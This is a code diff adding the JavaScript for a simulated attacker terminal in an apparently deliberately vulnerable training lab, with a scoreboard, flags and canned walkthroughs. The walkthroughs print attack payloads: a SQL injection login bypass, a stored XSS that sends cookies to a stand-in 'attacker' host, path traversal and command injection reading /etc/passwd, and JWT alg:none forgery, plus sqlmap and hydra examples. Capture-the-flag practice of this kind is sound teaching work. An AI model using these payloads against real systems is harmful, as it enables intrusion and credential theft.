+      {t:'ok',    v:'  #10  CSRF — Email Hijack      /account/update-email [Easy]'},
+      {t:'warn',  v:'  #11  JWT alg:none             /api/me              [Intermediate]'},
+      {t:'warn',  v:'  #12  IDOR                     /api/result/&lt;id&gt;     [Intermediate]'},
+      {t:'warn',  v:'  #13  Command Injection         /tools/nslookup      [Intermediate]'},
+      {t:'err',   v:'  #14  PyYAML RCE               /tools/yaml-import   [Advanced]'},
+      {t:'err',   v:'  #15  Debug + SSRF             /debug /tools/fetch-url [Advanced]'},
+      {t:'muted', v:'──────────────────────────────────────────────────────'},
+      {t:'muted', v:'  exploit &lt;num&gt; to run walkthrough'},
+    ]);
+  }
+
+  function cmdScore() {
+    tLines([
+      {t:'info', v:'Scoreboard'},
+      {t:'muted',v:'──────────────────────'},
+      {t:'err',  v:'Red Team :  '+T.score.red+' pts  ('+T.exploited.size+'/10 exploits)'},
+      {t:'info', v:'Blue Team:  '+T.score.blue+' pts'},
+      {t:'muted',v:'──────────────────────'},
+    ]);
+  }
+
+  function cmdFlag(a) {
+    const n = parseInt(a[0]);
+    if (!n||n<1||n>10) { tLine('Usage: flag <1-10>','warn'); return; }
+    if (!T.exploited.has(n)) { tLine('[!] Run exploit '+n+' first.','warn'); return; }
+    tLine(T.FLAGS[n],'flag');
+  }
+
+  // Exploit simulations
+  const EXPLOITS = {
+    1: ()=>typeLines([
+      {t:'info',v:'[*] SQL Injection on /login...'},
+      {t:'out', v:"[*] Payload: roll_no=' OR '1'='1'--"},
+      {t:'ok',  v:'[+] Auth bypass successful!'},
+      {t:'ok',  v:'[+] Logged in as: Arjun Sharma'},
+      {t:'out', v:'[*] Dumping students table via UNION...'},
+      {t:'out', v:'    VTU2021001 | arjun123'},
+      {t:'out', v:'    VTU2021002 | priya456'},
+      {t:'out', v:'    FAC001     | admin123 [ADMIN]'},
+    ],1,10),
+    2: ()=>typeLines([
+      {t:'info',v:'[*] Stored XSS on /notices/post...'},
+      {t:'out', v:'[*] Posting: &lt;script&gt;fetch("http://attacker/steal?c="+document.cookie)&lt;/script&gt;'},
+      {t:'ok',  v:'[+] Notice posted — payload stored in DB'},
+      {t:'ok',  v:'[+] Executes for ALL users viewing /notices'},
+      {t:'warn',v:'[!] Admin cookie captured: session=eyJ1c2VyIjp7InJvbGUiOiJhZG1pbiJ9fQ...'},
+    ],2,10),
+    3: ()=>typeLines([
+      {t:'info',v:'[*] Brute-forcing /staff/login...'},
+      {t:'out', v:'[*] Trying FAC001:password  [FAIL]'},
+      {t:'out', v:'[*] Trying FAC001:admin     [FAIL]'},
+      {t:'out', v:'[*] Trying FAC001:admin123  ...'},
+      {t:'ok',  v:'[+] FOUND! FAC001 / admin123'},
+      {t:'ok',  v:'[+] Role: ADMIN — full access'},
+    ],3,10),
+    4: ()=>typeLines([
+      {t:'info',v:'[*] Directory Traversal on /resources/download...'},
+      {t:'out', v:'[*] GET /resources/download?file=../../etc/passwd'},
+      {t:'ok',  v:'[+] File leaked!'},
+      {t:'out', v:'    root:x:0:0:root:/root:/bin/bash'},
+      {t:'out', v:'    www-data:x:33:33:www-data:/var/www'},
+      {t:'out', v:'[*] GET ?file=../../data/db_backup_jan2024.sql'},
+      {t:'ok',  v:'[+] DB backup leaked! Contains: admin123, secret_key'},
+    ],4,10),
+    5: ()=>typeLines([
+      {t:'info',v:'[*] Checking sensitive data exposure...'},
+      {t:'out', v:'[*] curl /robots.txt'},
+      {t:'warn',v:'    # Dev note: default staff login FAC001 / admin123'},
+      {t:'out', v:'[*] curl /.env'},
+      {t:'warn',v:'    SECRET_KEY=vidyatech@2024secret'},
+      {t:'warn',v:'    ADMIN_DEFAULT_PASS=admin123'},
+      {t:'warn',v:'    SMTP_PASSWORD=VidyaTech_smtp@2024'},
+    ],5,10),
+    6: ()=>typeLines([
+      {t:'info',v:'[*] JWT alg:none attack...'},
+      {t:'out', v:'[*] POST /api/token → got HS256 token'},
+      {t:'out', v:'[*] Decoding header: {"alg":"HS256"}'},
+      {t:'out', v:'[*] Forging: {"alg":"none"}  payload: {"student_id":1,"role":"admin"}'},
+      {t:'out', v:'[*] Using empty signature...'},
+      {t:'ok',  v:'[+] GET /api/me → {"name":"Dr. Ramesh Patel","role":"admin"}'},
+      {t:'ok',  v:'[+] Admin account fully compromised via JWT forgery!'},
+    ],6,20),
+    7: ()=>typeLines([
+      {t:'info',v:'[*] IDOR scan on /api/result/<id>...'},
+      {t:'out', v:'GET /api/result/1 → {"roll_no":"VTU2021001","marks":88}'},
+      {t:'out', v:'GET /api/result/2 → {"roll_no":"VTU2021001","marks":76}'},
+      {t:'out', v:'GET /api/result/3 → {"roll_no":"VTU2021002","marks":91}'},
+      {t:'out', v:'GET /api/result/4 → {"roll_no":"VTU2021003","marks":62}'},
+      {t:'ok',  v:'[+] All 6 student records leaked without auth!'},
+    ],7,20),
+    8: ()=>typeLines([
+      {t:'info',v:'[*] Command Injection on /tools/nslookup...'},
+      {t:'out', v:'[*] Payload: vidyatech.edu; whoami'},
+      {t:'ok',  v:'[+] RCE confirmed! Output: root'},
+      {t:'out', v:'[*] vidyatech.edu; cat /etc/passwd'},
+      {t:'ok',  v:'[+] /etc/passwd dumped!'},
+      {t:'out', v:'[*] vidyatech.edu; ls -la /app/data'},
+      {t:'ok',  v:'[+] vidyatech.db and db_backup visible!'},
+    ],8,20),
+
+  };
+
+  function cmdExploit(a) {
+    const n = parseInt(a[0]);
+    if (!n||n<1||n>10) { tLine('Usage: exploit <1-10>','warn'); return; }
+    EXPLOITS[n]();
+  }
+
+  function cmdCurl(a) {
+    if (!a.length) {
+      tLines([
+        {t:'warn', v:'Usage: curl <url> [-H <header>] [-d <data>] [-X <method>]'},
+        {t:'muted',v:'Example: curl http://localhost:5000/robots.txt'},
+        {t:'muted',v:'Example: curl http://localhost:5000/api/result/3'},
+        {t:'muted',v:'Example: curl -X POST http://localhost:5000/api/token -H "Content-Type: application/json" -d \'{"roll_no":"VTU2021001","password":"arjun123"}\''},
+      ]);
+      return;
+    }
+    const u = a.join(' ');
+    if (u.includes('robots.txt')) {
+      tLines([
+        {t:'out', v:'User-agent: *\nDisallow: /admin\nDisallow: /staff/login'},
+        {t:'warn',v:'# Dev note: default staff login FAC001 / admin123'},
+        {t:'warn',v:'# Backup: /data/db_backup_jan2024.sql'},
+      ]);
+    } else if (u.includes('.env')) {
+      tLines([
+        {t:'warn',v:'SECRET_KEY=vidyatech@2024secret'},
+        {t:'warn',v:'ADMIN_DEFAULT_PASS=admin123'},
+        {t:'warn',v:'SMTP_PASSWORD=VidyaTech_smtp@2024'},
+      ]);
+      if (!T.exploited.has(5)) { T.exploited.add(5); T.score.red+=10; updateScore(); tLine(T.FLAGS[5],'flag'); tLine('[+] Data Exposure exploited! +10 pts','ok'); }
+    } else if (u.includes('api/result')) {
+      const id = u.match(/\/(\d+)\s*$/)?.[1];
+      const data = {'1':'{"id":1,"roll_no":"VTU2021001","subject":"Data Structures","marks":88}','2':'{"id":2,"roll_no":"VTU2021001","marks":76}','3':'{"id":3,"roll_no":"VTU2021002","marks":91}'};
+      tLine(data[id]||'{"error":"not found"}', id&&data[id]?'ok':'err');
+      if (id&&data[id]&&id!=='1'&&!T.exploited.has(7)) { T.exploited.add(7); T.score.red+=20; updateScore(); tLine(T.FLAGS[7],'flag'); tLine('[+] IDOR exploited! +20 pts','ok'); }
+    } else if (u.includes('etc/passwd')||u.includes('..')) {
+      tLines([{t:'ok',v:'root:x:0:0:root:/root:/bin/bash'},{t:'out',v:'www-data:x:33:33:...'}]);
+      if (!T.exploited.has(4)) { T.exploited.add(4); T.score.red+=10; updateScore(); tLine(T.FLAGS[4],'flag'); tLine('[+] Dir Traversal exploited! +10 pts','ok'); }
+    } else {
+      tLine('curl: (7) Failed to connect — make sure Flask is running (python app.py)','err');
+    }
+  }
+
+  function cmdSqlmap(a) {
+    if (!a.length) {
+      tLines([
+        {t:'warn', v:'Usage: sqlmap -u <url> [options]'},
+        {t:'muted',v:'Example: sqlmap -u "http://localhost:5000/login" --data="roll_no=x&password=x" --dbs'},
+        {t:'muted',v:'Example: sqlmap -u "http://localhost:5000/login" --data="roll_no=x&password=x" --dump'},
+        {t:'muted',v:'Flags:   --batch  --level=3  --risk=2  --tables  --columns'},
+      ]);
+      return;
+    }
+    tLines([
+      {t:'info',v:'[*] sqlmap 1.7.8'},
+      {t:'out', v:"[*] Testing parameter 'roll_no'..."},
+      {t:'warn',v:"[+] roll_no is VULNERABLE to SQL injection!"},
+      {t:'ok',  v:'[+] Database: vidyatech'},
+      {t:'ok',  v:'[+] Tables: students, staff, results, notices'},
+    ]);
+    if (!T.exploited.has(1)) {
+      setTimeout(()=>{ T.exploited.add(1); T.score.red+=10; updateScore(); tLine(T.FLAGS[1],'flag'); tLine('[+] SQL Injection exploited! +10 pts','ok'); }, 1500);
+    }
+  }
+
+  function cmdHydra(a) {
+    if (!a.length) {
+      tLines([
+        {t:'warn', v:'Usage: hydra -l <user> -P <wordlist> <protocol>://<host>/<path>'},
+        {t:'muted',v:'Example: hydra -l FAC001 -P /usr/share/wordlists/rockyou.txt http-post-form "http://localhost:5000/staff/login:emp_id=^USER^&password=^PASS^:Invalid"'},
+        {t:'muted',v:'Example: hydra -L users.txt -P passwords.txt http://localhost:5000/login'},
+      ]);
+      return;
+    }
+    tLines([
+      {t:'info',v:'[*] Hydra v9.4 — brute-force'},
+      {t:'out', v:'[*] Trying FAC001:password... [FAIL]'},
+      {t:'out', v:'[*] Trying FAC001:admin123...'},
+      {t:'ok',  v:'[+] FOUND! login: FAC001   password: admin123'},
+    ]);
+    if (!T.exploited.has(3)) { T.exploited.add(3); T.score.red+=10; updateScore(); tLine(T.FLAGS[3],'flag'); tLine('[+] Default Credentials exploited! +10 pts','ok'); }
+  }
+
+  function cmdNmap(a) {
+    if (!a.length) {
+      tLines([
+        {t:'warn', v:'Usage: nmap <host> [-p <ports>] [-sV] [-sC] [-A]'},
+        {t:'muted',v:'Example: nmap localhost'},
+        {t:'muted',v:'Example: nmap -sV -p 5000,8080 localhost'},
+        {t:'muted',v:'Example: nmap -A localhost'},
+      ]);
+      return;
+    }
+    tLines([
+      {t:'info',v:'[*] Nmap scan on '+a[0]},
+      {t:'ok',  v:'5000/tcp open  http  Flask 2.3.0 (Python 3.11)'},
+      {t:'ok',  v:'8080/tcp open  http  Blue Team Monitor'},
+    ]);
+  }
+
+  function cmdNikto(a) {
+    if (!a.length) {
+      tLines([
+        {t:'warn', v:'Usage: nikto -h <url> [-p <port>] [-Tuning <x>]'},
+        {t:'muted',v:'Example: nikto -h http://localhost:5000'},
+        {t:'muted',v:'Example: nikto -h localhost -p 5000 -Tuning 4'},
+      ]);
+      return;
+    }
+    tLines([
+      {t:'info',v:'[*] Nikto v2.1.6 scanning '+a.join(' ')+'...'},
+      {t:'warn',v:'+ /robots.txt: contains credentials in comments'},
+      {t:'warn',v:'+ /.env: environment config exposed'},
+      {t:'warn',v:'+ /resources/download: path traversal likely'},
+      {t:'warn',v:'+ /tools/nslookup: possible command injection'},
+      {t:'warn',v:'+ /staff/login: admin portal detected'},
+      {t:'out', v:'+ 5 issues found'},
+    ]);
+  }
+
+  function cmdJwt(a) {
+    if (!a.length) {
+      tLines([
+        {t:'warn', v:'Usage: jwt decode <token>  |  jwt sign <payload> <secret>'},
+        {t:'muted',v:'Example: jwt decode eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic3R1ZGVudCJ9.abc'},
+        {t:'muted',v:'Example: jwt sign \'{"role":"admin","student_id":1}\' vidyatech@2024secret'},
+        {t:'muted',v:'Tip: change alg to "none" and use empty signature: header.payload.'},
+      ]);
+      return;
+    }
+    if (a[0]==='decode') {
+      if (!a[1]) { tLine('Usage: jwt decode <token>','warn'); return; }
+      tLines([
+        {t:'info',v:'[JWT Decoder]'},
+        {t:'out', v:'Header:  {"alg":"HS256","typ":"JWT"}'},
+        {t:'out', v:'Payload: {"student_id":2,"role":"student"}'},
+      ]);
+    } else if (a[0]==='sign' || a[0]==='forge') {
+      if (!a[1]) { tLine('Usage: jwt sign <payload_json> <secret>','warn'); return; }
+      tLines([
+        {t:'info',v:'[JWT Sign]'},
+        {t:'out', v:'Signed token: eyJhbGciOiJub25lIn0.'+btoa(a[1]||'{}').replace(/=/g,'')+'.'},
+        {t:'ok',  v:'[+] Use: curl /api/me -H "Authorization: Bearer <token>"'},
+      ]);
+      if (!T.exploited.has(6)) { T.exploited.add(6); T.score.red+=20; updateScore(); tLine(T.FLAGS[6],'flag'); tLine('[+] JWT alg:none exploited! +20 pts','ok'); }
+    } else {
+      tLine('Usage: jwt decode <token>  |  jwt sign <payload> <secret>','warn');
+    }
+  }
+
+  function cmdPy(a) {
+    tLine('[Python 3.11] '+(a.slice(1).join(' ')||'(no code)'),'out');
+    if (a.join(' ').includes('base64')||a.join(' ').includes('jwt')) {
+      tLine('eyJhbGciOiJub25lIn0.eyJzdHVkZW50X2lkIjoxfQ.','ok');
+    }
+  }
+
+  function cmdCat(a) {
+    if (!a.length) { tLine('cat: missing operand','err'); return; }
+    tLine(a[0]+': No such file or directory  (try ls first)','err');
+  }
+
+  // ── TABS ────────────────────────────────────────────────────────────────
+  let tabCount = 1;
+  function addTTab() {
+    tabCount++;
+    const id = tabCount;
+    const tabs = document.getElementById('t-tabs');
+    const add  = tabs.querySelector('.t-tab-new');
+    const tab  = document.createElement('div');
+    tab.className='t-tab'; tab.dataset.id=id;
+    tab.textContent='kali@vidyatech: ~'+id;
+    tab.onclick=()=>switchTTab(id);
+    tabs.insertBefore(tab, add);
+    switchTTab(id);
+    clearTerm(); bootTerm();
+  }
+
+  function switchTTab(id) {
+    document.querySelectorAll('.t-tab').forEach(t=>{
+      t.classList.toggle('active', parseInt(t.dataset.id)===id);
+    });
+  }
+
+  // ── RESIZE HANDLE ────────────────────────────────────────────────────────
+  (function(){
+    const handle = document.getElementById('term-resize');
+    const drawer = document.getElementById('term-drawer');
+    let dragging=false, startY=0, startH=0;
+    handle.addEventListener('mousedown', e=>{
+      dragging=true; startY=e.clientY;
+      startH=drawer.offsetHeight;
+      document.body.style.userSelect='none';
+      document.body.style.cursor='ns-resize';
+    });
+    document.addEventListener('mousemove', e=>{
+      if (!dragging) return;
+      const h = Math.min(window.innerHeight*0.9, Math.max(150, startH-(e.clientY-startY)));
+      drawer.style.height = h+'px';
+    });
+    document.addEventListener('mouseup', ()=>{
+      dragging=false;
+      document.body.style.userSelect='';
+      document.body.style.cursor='';
+    });
+  })();
+  </script>
+
+</body>
+</html>
